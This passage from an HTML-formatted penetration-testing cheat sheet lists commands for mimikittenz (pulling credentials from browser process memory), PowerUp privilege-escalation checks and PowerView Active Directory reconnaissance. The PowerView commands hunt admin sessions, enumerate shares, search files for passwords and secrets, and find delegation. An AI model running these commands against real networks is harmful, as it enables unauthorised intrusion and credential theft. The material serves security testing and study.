5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">Custom</span> <span class="nv">regex</span> <span class="o">-</span> <span class="nv">The</span> <span class="nv">syntax</span> <span class="k">for</span> <span class="nv">adding</span> <span class="nv">custom</span> <span class="nv">regex</span> <span class="nv">is</span> <span class="nv">as</span> <span class="nv">follows</span>:
    [<span class="nv">mimikittenz</span>.<span class="nv">MemProcInspector</span>]::<span class="nv">AddRegex</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">&lt;NameOfTarget&gt;</span><span class="s2">&quot;</span>,<span class="s2">&quot;</span><span class="s">&lt;regex_here&gt;</span><span class="s2">&quot;</span><span class="ss">)</span>

    <span class="nv">Custom</span> <span class="nv">target</span> <span class="nv">process</span> <span class="o">-</span> <span class="nv">Just</span> <span class="nv">append</span> <span class="nv">your</span> <span class="nv">target</span> <span class="nv">proccess</span> <span class="nv">name</span> <span class="nv">into</span> <span class="nv">the</span> <span class="nv">array</span>:
    [<span class="nv">mimikittenz</span>.<span class="nv">MemProcInspector</span>]::<span class="nv">InspectManyProcs</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">iexplore</span><span class="s2">&quot;</span>,<span class="s2">&quot;</span><span class="s">chrome</span><span class="s2">&quot;</span>,<span class="s2">&quot;</span><span class="s">firefox</span><span class="s2">&quot;</span><span class="ss">)</span>
</pre></div>
</td></tr></table></p>
<h4 id="powerup">PowerUp<a class="headerlink" href="#powerup" title="Permanent link">&para;</a></h4>
<p>Performs multiple local host privilege escalation checks for common Windows misconfigurations. 
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">Invoke</span><span class="o">-</span><span class="n">AllChecks</span>
</pre></div>
</td></tr></table></p>
<p><a href="https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf">See cheat sheet for more commands</a></p>
<h4 id="powerview">PowerView<a class="headerlink" href="#powerview" title="Permanent link">&para;</a></h4>
<ul>
<li>Requires domain user privileges</li>
</ul>
<p>Find Administrative users logged in across the domain - default group = Domain Admins) 
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">Invoke</span><span class="o">-</span><span class="n">UserHunter</span> <span class="o">-</span><span class="n">Threads</span> <span class="mi">15</span> <span class="o">-</span><span class="n">NoPing</span> <span class="p">[</span><span class="o">-</span><span class="n">GroupName</span> <span class="err"></span><span class="n">Enterprise</span> <span class="n">Admins</span><span class="err"></span><span class="p">]</span>
    <span class="n">Invoke</span><span class="o">-</span><span class="n">UserHunter</span> <span class="o">-</span><span class="n">Threads</span> <span class="mi">20</span> <span class="o">-</span><span class="n">GroupName</span> <span class="ss">&quot;Domain Admins&quot;</span> <span class="o">-</span><span class="n">SearchForest</span> <span class="o">-</span><span class="n">CheckAccess</span>
</pre></div>
</td></tr></table></p>
<p>Find User (Stealthy via Fileshares)
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">Invoke</span><span class="o">-</span><span class="n">UserHunter</span> <span class="o">-</span><span class="n">Stealth</span> <span class="o">-</span><span class="n">Threads</span> <span class="mi">5</span> <span class="o">-</span><span class="n">NoPing</span> <span class="p">[</span><span class="o">-</span><span class="n">GroupName</span> <span class="err"></span><span class="n">Enterprise</span> <span class="n">Admins</span><span class="err"></span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">UserName</span> <span class="ss">&quot;svcAccount&quot;</span><span class="p">]</span>
</pre></div>
</td></tr></table></p>
<p>Get domain user info
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="w">    </span><span class="k">Get</span><span class="o">-</span><span class="n">NetUser</span><span class="w"> </span><span class="o">[</span><span class="n">-UserName john</span><span class="o">]</span><span class="w"></span>

<span class="w">    </span><span class="k">Get</span><span class="o">-</span><span class="n">NetUser</span><span class="w"> </span><span class="o">-</span><span class="k">Domain</span><span class="w"> </span><span class="o">&lt;</span><span class="k">domain</span><span class="o">&gt;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Select</span><span class="o">-</span><span class="k">Object</span><span class="w"> </span><span class="n">objectsid</span><span class="p">,</span><span class="n">lockouttime</span><span class="p">,</span><span class="n">samaccounttype</span><span class="p">,</span><span class="n">accountexpires</span><span class="p">,</span><span class="n">objectclass</span><span class="p">,</span><span class="n">useraccountcontrol</span><span class="p">,</span><span class="err">@{</span><span class="n">Name</span><span class="o">=</span><span class="s1">&#39;memberof&#39;</span><span class="p">;</span><span class="n">Expression</span><span class="o">=</span><span class="err">{</span><span class="o">[</span><span class="n">string</span><span class="o">]::</span><span class="k">join</span><span class="p">(</span><span class="ss">&quot;;&quot;</span><span class="p">,(</span><span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">memberof</span><span class="p">))</span><span class="err">}}</span><span class="p">,</span><span class="n">info</span><span class="p">,</span><span class="n">distinguishedname</span><span class="p">,</span><span class="n">adspath</span><span class="p">,</span><span class="n">cn</span><span class="p">,</span><span class="n">pwdlastset</span><span class="p">,</span><span class="n">objectguid</span><span class="p">,</span><span class="n">whencreated</span><span class="p">,</span><span class="n">description</span><span class="p">,</span><span class="n">samaccountname</span><span class="p">,</span><span class="n">usnchanged</span><span class="p">,</span><span class="n">name</span><span class="o">|</span><span class="w">  </span><span class="n">export</span><span class="o">-</span><span class="n">csv</span><span class="w"> </span><span class="n">userprops_members</span><span class="p">.</span><span class="n">csv</span><span class="w"></span>
</pre></div>
</td></tr></table></p>
<p>Find group names
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">Get</span><span class="o">-</span><span class="n">NetGroup</span> <span class="p">[</span><span class="o">-</span><span class="n">GroupName</span> <span class="o">*</span><span class="k">admin</span><span class="o">*</span><span class="p">]</span>
</pre></div>
</td></tr></table></p>
<p>Get group members
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">Get</span><span class="o">-</span><span class="n">NetGroupMember</span> <span class="p">[</span><span class="o">-</span><span class="n">GroupName</span> <span class="err"></span><span class="k">Domain</span> <span class="n">Admins</span><span class="err"></span><span class="p">]</span>
</pre></div>
</td></tr></table></p>
<p>Find open shares - Noisy
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">Invoke</span><span class="o">-</span><span class="n">ShareFinder</span> <span class="o">-</span><span class="n">CheckShareAccess</span>
</pre></div>
</td></tr></table></p>
<p>Find open (non-default i.e. C$) shares by LDAP source
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">Invoke</span><span class="o">-</span><span class="n">ShareFinder</span> <span class="o">-</span><span class="n">ComputerADSPath</span> <span class="ss">&quot;LDAP://OU=Servers,OU=IT,DC=domain,DC=com&quot;</span> <span class="o">-</span><span class="n">CheckShareAccess</span> <span class="o">-</span><span class="n">ExcludeStandard</span> <span class="o">|</span> <span class="k">Out</span><span class="o">-</span><span class="n">File</span> <span class="o">-</span><span class="k">Encoding</span> <span class="n">ascii</span> <span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">temp</span><span class="err">\</span><span class="n">server_shares</span><span class="p">.</span><span class="n">txt</span>

    <span class="n">Invoke</span><span class="o">-</span><span class="n">ShareFinder</span> <span class="o">-</span><span class="n">ExcludePrint</span> <span class="o">-</span><span class="n">ExcludeIPC</span> <span class="o">-</span><span class="n">CheckShareAccess</span>
</pre></div>
</td></tr></table></p>
<p>Find interesting files
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">powershell</span> <span class="n">Invoke</span><span class="o">-</span><span class="n">FileFinder</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="o">&lt;</span><span class="n">hostname</span><span class="o">&gt;</span> <span class="o">-</span><span class="k">share</span> <span class="n">share_list</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">terms</span> <span class="n">ssn</span><span class="p">,</span><span class="n">pass</span><span class="p">,</span><span class="k">sensitive</span><span class="p">,</span><span class="n">secret</span><span class="p">,</span><span class="k">admin</span><span class="p">,</span><span class="n">login</span><span class="p">,</span><span class="n">unattend</span><span class="o">*</span><span class="p">.</span><span class="n">xml</span><span class="p">,</span><span class="n">web</span><span class="p">.</span><span class="n">config</span><span class="p">,</span><span class="n">account</span> <span class="o">-</span><span class="n">Threads</span> <span class="mi">20</span> <span class="o">|</span> <span class="n">export</span><span class="o">-</span><span class="n">csv</span> <span class="n">filefinder_shares</span><span class="p">.</span><span class="n">csv</span>
</pre></div>
</td></tr></table></p>
<p>Find hosts where the current user is local admin - Noisy
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">Find</span><span class="o">-</span><span class="n">LocalAdminAccess</span>
</pre></div>
</td></tr></table></p>
<p>Get details of all domain computers and export to a CSV file for easy viewing
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="w">    </span><span class="k">Get</span><span class="o">-</span><span class="n">computerproperty</span><span class="w"> </span><span class="o">-</span><span class="k">Domain</span><span class="w"> </span><span class="o">&lt;</span><span class="k">domain</span><span class="p">.</span><span class="n">com</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">properties</span><span class="w"> </span><span class="n">displayname</span><span class="p">,</span><span class="n">adspath</span><span class="p">,</span><span class="n">lastlogontimestamp</span><span class="p">,</span><span class="n">operatingsystem</span><span class="p">,</span><span class="n">operatingsystemversion</span><span class="p">,</span><span class="err">@{</span><span class="n">Name</span><span class="o">=</span><span class="s1">&#39;memberof&#39;</span><span class="p">;</span><span class="n">Expression</span><span class="o">=</span><span class="err">{</span><span class="o">[</span><span class="n">string</span><span class="o">]::</span><span class="k">join</span><span class="p">(</span><span class="ss">&quot;;&quot;</span><span class="p">,(</span><span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">memberof</span><span class="p">))</span><span class="err">}}</span><span class="o">|</span><span class="n">export</span><span class="o">-</span><span class="n">csv</span><span class="w"> </span><span class="n">computerprops</span><span class="p">.</span><span class="n">csv</span><span class="w"></span>
</pre></div>
</td></tr></table></p>
<p>Get Computers with Unconstrained Delegation
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">Get</span><span class="o">-</span><span class="n">NetComputer</span> <span class="o">-</span><span class="n">Unconstrained</span> <span class="o">|</span><span class="n">ft</span> <span class="o">-</span><span class="n">a</span>
</pre></div>
</td></tr></table></p>
<p>Get Users &amp; Computers Trusted for Delegation
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">Get</span><span class="o">-</span><span class="n">DomainUser</span> <span class="o">-</span><span class="n">TrustedtoAuth</span> <span class="o">-</span><span class="n">Properties</span> <span class="n">distinguisedname</span><span class="p">,</span><span class="n">useraccountcontrol</span><span class="p">,</span><span class="n">msds</span><span class="o">-</span><span class="n">allowedtodelegateto</span><span class="o">|</span><span class="n">fl</span>

    <span class="k">Get</span><span class="o">-</span><span class="n">DomainComputer</span> <span class="o">-</span><span class="n">TrustedtoAuth</span> <span class="o">-</span><span class="n">Properties</span> <span class="n">distinguisedname</span><span class="p">,</span><span class="n">useraccountcontrol</span><span class="p">,</span><span class="n">msds</span><span class="o">-</span><span class="n">allowedtodelegateto</span><span class="o">|</span><span class="n">fl</span>
</pre></div>
</td></tr></table></p>
<h5 id="net-functions">net * Functions:<a class="headerlink" href="#net-functions" title="Permanent link">&para;</a></h5>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetDomain</span>                   <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">the</span> <span class="nv">name</span> <span class="nv">of</span> <span class="nv">the</span> <span class="nv">current</span> <span class="nv">user</span><span class="s1">&#39;</span><span class="s">s domain</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetForest</span>                   <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">the</span> <span class="nv">forest</span> <span class="nv">associated</span> <span class="nv">with</span> <span class="nv">the</span> <span class="nv">current</span> <span class="nv">user</span><span class="s1">&#39;</span><span class="s">s domain</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetForestDomain</span>             <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">all</span> <span class="nv">domains</span> <span class="k">for</span> <span class="nv">the</span> <span class="nv">current</span> <span class="nv">forest</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetDomainController</span>         <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">the</span> <span class="nv">domain</span> <span class="nv">controllers</span> <span class="k">for</span> <span class="nv">the</span> <span class="nv">current</span> <span class="nv">computer</span><span class="s1">&#39;</span><span class="s">s domain</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetUser</span>                     <span class="o">-</span>   <span class="nv">returns</span> <span class="nv">all</span> <span class="nv">user</span> <span class="nv">objects</span>, <span class="nv">or</span> <span class="nv">the</span> <span class="nv">user</span> <span class="nv">specified</span> <span class="ss">(</span><span class="nv">wildcard</span> <span class="nv">specifiable</span><span class="ss">)</span>
    <span class="nv">Add</span><span class="o">-</span><span class="nv">NetUser</span>                     <span class="o">-</span>   <span class="nv">adds</span> <span class="nv">a</span> <span class="nv">local</span> <span class="nv">or</span> <span class="nv">domain</span> <span class="nv">user</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetComputer</span>                 <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">a</span> <span class="nv">list</span> <span class="nv">of</span> <span class="nv">all</span> <span class="nv">current</span> <span class="nv">servers</span> <span class="nv">in</span> <span class="nv">the</span> <span class="nv">domain</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetPrinter</span>                  <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">an</span> <span class="nv">array</span> <span class="nv">of</span> <span class="nv">all</span> <span class="nv">current</span> <span class="nv">computers</span> <span class="nv">objects</span> <span class="nv">in</span> <span class="nv">a</span> <span class="nv">domain</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetOU</span>                       <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">data</span> <span class="k">for</span> <span class="nv">domain</span> <span class="nv">organization</span> <span class="nv">units</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetSite</span>                     <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">current</span> <span class="nv">sites</span> <span class="nv">in</span> <span class="nv">a</span> <span class="nv">domain</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetSubnet</span>                   <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">registered</span> <span class="nv">subnets</span> <span class="k">for</span> <span class="nv">a</span> <span class="nv">domain</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetGroup</span>                    <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">a</span> <span class="nv">list</span> <span class="nv">of</span> <span class="nv">all</span> <span class="nv">current</span> <span class="nv">groups</span> <span class="nv">in</span> <span class="nv">a</span> <span class="nv">domain</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetGroupMember</span>              <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">a</span> <span class="nv">list</span> <span class="nv">of</span> <span class="nv">all</span> <span class="nv">current</span> <span class="nv">users</span> <span class="nv">in</span> <span class="nv">a</span> <span class="nv">specified</span> <span class="nv">domain</span> <span class="nv">group</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetLocalGroup</span>               <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">the</span> <span class="nv">members</span> <span class="nv">of</span> <span class="nv">a</span> <span class="nv">localgroup</span> <span class="nv">on</span> <span class="nv">a</span> <span class="nv">remote</span> <span class="nv">host</span> <span class="nv">or</span> <span class="nv">hosts</span>
    <span class="nv">Add</span><span class="o">-</span><span class="nv">NetGroupUser</span>                <span class="o">-</span>   <span class="nv">adds</span> <span class="nv">a</span> <span class="nv">local</span> <span class="nv">or</span> <span class="nv">domain</span> <span class="nv">user</span> <span class="nv">to</span> <span class="nv">a</span> <span class="nv">local</span> <span class="nv">or</span> <span class="nv">domain</span> <span class="nv">group</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetFileServer</span>               <span class="o">-</span>   <span class="nv">get</span> <span class="nv">a</span> <span class="nv">list</span> <span class="nv">of</span> <span class="nv">file</span> <span class="nv">servers</span> <span class="nv">used</span> <span class="nv">by</span> <span class="nv">current</span> <span class="nv">domain</span> <span class="nv">users</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">DFSshare</span>                    <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">a</span> <span class="nv">list</span> <span class="nv">of</span> <span class="nv">all</span> <span class="nv">distribute</span> <span class="nv">file</span> <span class="nv">system</span> <span class="nv">shares</span> <span class="nv">on</span> <span class="nv">a</span> <span class="nv">domain</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetShare</span>                    <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">share</span> <span class="nv">information</span> <span class="k">for</span> <span class="nv">a</span> <span class="nv">specified</span> <span class="nv">server</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetLoggedon</span>                 <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">users</span> <span class="nv">actively</span> <span class="nv">logged</span> <span class="nv">onto</span> <span class="nv">a</span> <span class="nv">specified</span> <span class="nv">server</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetSession</span>                  <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">active</span> <span class="nv">sessions</span> <span class="nv">on</span> <span class="nv">a</span> <span class="nv">specified</span> <span class="nv">server</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetRDPSession</span>               <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">active</span> <span class="nv">RDP</span> <span class="nv">sessions</span> <span class="k">for</span> <span class="nv">a</span> <span class="nv">specified</span> <span class="nv">server</span> <span class="ss">(</span><span class="nv">like</span> <span class="nv">qwinsta</span><span class="ss">)</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetProcess</span>                  <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">the</span> <span class="nv">remote</span> <span class="nv">processes</span> <span class="nv">and</span> <span class="nv">owners</span> <span class="nv">on</span> <span class="nv">a</span> <span class="nv">remote</span> <span class="nv">server</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">UserEvent</span>                   <span class="o">-</span>   <span class="nv">returns</span> <span class="nv">logon</span> <span class="nv">or</span> <span class="nv">TGT</span> <span class="nv">events</span> <span class="nv">from</span> <span class="nv">the</span> <span class="nv">event</span> <span class="nv">log</span> <span class="k">for</span> <span class="nv">a</span> <span class="nv">specified</span> <span class="nv">host</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">ADObject</span>                    <span class="o">-</span>   <span class="nv">takes</span> <span class="nv">a</span> <span class="nv">domain</span> <span class="nv">SID</span> <span class="nv">and</span> <span class="nv">returns</span> <span class="nv">the</span> <span class="nv">user</span>, <span class="nv">group</span>, <span class="nv">or</span> <span class="nv">computer</span> 
                                        <span class="nv">object</span> <span class="nv">associated</span> <span class="nv">with</span> <span class="nv">it</span>
    <span class="nv">Set</span><span class="o">-</span><span class="nv">ADObject</span>                    <span class="o">-</span>   <span class="nv">takes</span> <span class="nv">a</span> <span class="nv">SID</span>, <span class="nv">name</span>, <span class="nv">or</span> <span class="nv">SamAccountName</span> <span class="nv">to</span> <span class="nv">query</span> <span class="k">for</span> <span class="nv">a</span> <span class="nv">specified</span>
                                        <span class="nv">domain</span> <span class="nv">object</span>, <span class="nv">and</span> <span class="k">then</span> <span class="nv">sets</span> <span class="nv">a</span> <span class="nv">specified</span> <span class="s1">&#39;</span><span class="s">PropertyName</span><span class="s1">&#39;</span> <span class="nv">to</span> <span class="nv">a</span>
                                        <span class="nv">specified</span> <span class="s1">&#39;</span><span class="s">PropertyValue</span><span class="s1">&#39;</span>
</pre></div>
</td></tr></table>

<h5 id="gpo-functions">GPO functions<a class="headerlink" href="#gpo-functions" title="Permanent link">&para;</a></h5>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">Get</span><span class="o">-</span><span class="nv">GptTmpl</span>                     <span class="o">-</span>   <span class="nv">parses</span> <span class="nv">a</span> <span class="nv">GptTmpl</span>.<span class="nv">inf</span> <span class="nv">to</span> <span class="nv">a</span> <span class="nv">custom</span> <span class="nv">object</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetGPO</span>                      <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">all</span> <span class="nv">current</span> <span class="nv">GPOs</span> <span class="k">for</span> <span class="nv">a</span> <span class="nv">given</span> <span class="nv">domain</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetGPOGroup</span>                 <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">all</span> <span class="nv">GPOs</span> <span class="nv">in</span> <span class="nv">a</span> <span class="nv">domain</span> <span class="nv">that</span> <span class="nv">set</span> <span class="s2">&quot;</span><span class="s">Restricted Groups</span><span class="s2">&quot;</span> 
                                        <span class="nv">on</span> <span class="nv">on</span> <span class="nv">target</span> <span class="nv">machines</span>
    <span class="nv">Find</span><span class="o">-</span><span class="nv">GPOLocation</span>                <span class="o">-</span>   <span class="nv">takes</span> <span class="nv">a</span> <span class="nv">user</span><span class="o">/</span><span class="nv">group</span> <span class="nv">and</span> <span class="nv">makes</span> <span class="nv">machines</span> <span class="nv">they</span> <span class="nv">have</span> <span class="nv">effective</span>
                                        <span class="nv">rights</span> <span class="nv">over</span> <span class="nv">through</span> <span class="nv">GPO</span> <span class="nv">enumeration</span> <span class="nv">and</span> <span class="nv">correlation</span>
    <span class="nv">Find</span><span class="o">-</span><span class="nv">GPOComputerAdmin</span>           <span class="o">-</span>   <span class="nv">takes</span> <span class="nv">a</span> <span class="nv">computer</span> <span class="nv">and</span> <span class="nv">determines</span> <span class="nv">who</span> <span class="nv">has</span> <span class="nv">admin</span> <span class="nv">rights</span> <span class="nv">over</span> <span class="nv">it</span>
                                        <span class="nv">through</span> <span class="nv">GPO</span> <span class="nv">enumeration</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">DomainPolicy</span>                <span class="o">-</span>   <span class="nv">returns</span> <span class="nv">the</span> <span class="nv">default</span> <span class="nv">domain</span> <span class="nv">or</span> <span class="nv">DC</span> <span class="nv">policy</span>
</pre></div>
</td></tr></table>

<h5 id="user-hunting-functions">User-Hunting Functions:<a class="headerlink" href="#user-hunting-functions" title="Permanent link">&para;</a></h5>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">Invoke</span><span class="o">-</span><span class="nv">UserHunter</span>               <span class="o">-</span>   <span class="nv">finds</span> <span class="nv">machines</span> <span class="nv">on</span> <span class="nv">the</span> <span class="nv">local</span> <span class="nv">domain</span> <span class="nv">where</span> <span class="nv">specified</span> <span class="nv">users</span> <span class="nv">are</span> <span class="nv">logged</span> <span class="nv">into</span>, <span class="nv">and</span> <span class="nv">can</span> <span class="nv">optionally</span> <span class="nv">check</span> <span class="k">if</span> <span class="nv">the</span> <span class="nv">current</span> <span class="nv">user</span> <span class="nv">has</span> <span class="nv">local</span> <span class="nv">admin</span> <span class="nv">access</span> <span class="nv">to</span> <span class="nv">found</span> <span class="nv">machines</span>
    <span class="nv">Invoke</span><span class="o">-</span><span class="nv">StealthUserHunter</span>        <span class="o">-</span>   <span class="nv">finds</span> <span class="nv">all</span> <span class="nv">file</span> <span class="nv">servers</span> <span class="nv">utilizes</span> <span class="nv">in</span> <span class="nv">user</span> <span class="nv">HomeDirectories</span>, <span class="nv">and</span> <span class="nv">checks</span> <span class="nv">the</span> <span class="nv">sessions</span> <span class="nv">one</span> <span class="nv">each</span> <span class="nv">file</span> <span class="nv">server</span>, <span class="nv">hunting</span> <span class="k">for</span> <span class="nv">particular</span> <span class="nv">users</span>
    <span class="nv">Invoke</span><span class="o">-</span><span class="nv">ProcessHunter</span>            <span class="o">-</span>   <span class="nv">hunts</span> <span class="k">for</span> <span class="nv">processes</span> <span class="nv">with</span> <span class="nv">a</span> <span class="nv">specific</span> <span class="nv">name</span> <span class="nv">or</span> <span class="nv">owned</span> <span class="nv">by</span> <span class="nv">a</span> <span class="nv">specific</span> <span class="nv">user</span> <span class="nv">on</span> <span class="nv">domain</span> <span class="nv">machines</span>
    <span class="nv">Invoke</span><span class="o">-</span><span class="nv">UserEventHunter</span>          <span class="o">-</span>   <span class="nv">hunts</span> <span class="k">for</span> <span class="nv">user</span> <span class="nv">logon</span> <span class="nv">events</span> <span class="nv">in</span> <span class="nv">domain</span> <span class="nv">controller</span> <span class="nv">event</span> <span class="nv">logs</span>
</pre></div>
</td></tr></table>

<h5 id="domain-trust-functions">Domain Trust Functions:<a class="headerlink" href="#domain-trust-functions" title="Permanent link">&para;</a></h5>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetDomainTrust</span>              <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">all</span> <span class="nv">trusts</span> <span class="k">for</span> <span class="nv">the</span> <span class="nv">current</span> <span class="nv">user</span><span class="s1">&#39;</span><span class="s">s domain</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">NetForestTrust</span>              <span class="o">-</span>   <span class="nv">gets</span> <span class="nv">all</span> <span class="nv">trusts</span> <span class="k">for</span> <span class="nv">the</span> <span class="nv">forest</span> <span class="nv">associated</span> <span class="nv">with</span> <span class="nv">the</span> <span class="nv">current</span> <span class="nv">user</span><span class="s1">&#39;</span><span class="s">s domain</span>
    <span class="nv">Find</span><span class="o">-</span><span class="nv">ForeignUser</span>                <span class="o">-</span>   <span class="nv">enumerates</span> <span class="nv">users</span> <span class="nv">who</span> <span class="nv">are</span> <span class="nv">in</span> <span class="nv">groups</span> <span class="nv">outside</span> <span class="nv">of</span> <span class="nv">their</span> <span class="nv">principal</span> <span class="nv">domain</span>
    <span class="nv">Find</span><span class="o">-</span><span class="nv">ForeignGroup</span>               <span class="o">-</span>   <span class="nv">enumerates</span> <span class="nv">all</span> <span class="nv">the</span> <span class="nv">members</span> <span class="nv">of</span> <span class="nv">a</span> <span class="nv">domain</span><span class="s1">&#39;</span><span class="s">s groups and finds users that are outside of the queried domain</span>
    <span class="nv">Invoke</span><span class="o">-</span><span class="nv">MapDomainTrust</span>           <span class="o">-</span>   <span class="nv">try</span> <span class="nv">to</span> <span class="nv">build</span> <span class="nv">a</span> <span class="nv">relational</span> <span class="nv">mapping</span> <span class="nv">of</span> <span class="nv">all</span> <span class="nv">domain</span> <span class="nv">trusts</span>
</pre></div>
</td></tr></table>

<h5 id="metafunctions">MetaFunctions:<a class="headerlink" href="#metafunctions" title="Permanent link">&para;</a></h5>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">Invoke</span><span class="o">-</span><span class="nv">ShareFinder</span>              <span class="o">-</span>   <span class="nv">finds</span> <span class="ss">(</span><span class="nv">non</span><span class="o">-</span><span class="nv">standard</span><span class="ss">)</span> <span class="nv">shares</span> <span class="nv">on</span> <span class="nv">hosts</span> <span class="nv">in</span> <span class="nv">the</span> <span class="nv">local</span> <span class="nv">domain</span>
    <span class="nv">Invoke</span><span class="o">-</span><span class="nv">FileFinder</span>               <span class="o">-</span>   <span class="nv">finds</span> <span class="nv">potentially</span> <span class="nv">sensitive</span> <span class="nv">files</span> <span class="nv">on</span> <span class="nv">hosts</span> <span class="nv">in</span> <span class="nv">the</span> <span class="nv">local</span> <span class="nv">domain</span>
    <span class="nv">Find</span><span class="o">-</span><span class="nv">LocalAdminAccess</span>           <span class="o">-</span>   <span class="nv">finds</span> <span class="nv">machines</span> <span class="nv">on</span> <span class="nv">the</span> <span class="nv">domain</span> <span class="nv">that</span> <span class="nv">the</span> <span class="nv">current</span> <span class="nv">user</span> <span class="nv">has</span> <span class="nv">local</span> <span class="nv">admin</span> <span class="nv">access</span> <span class="nv">to</span>
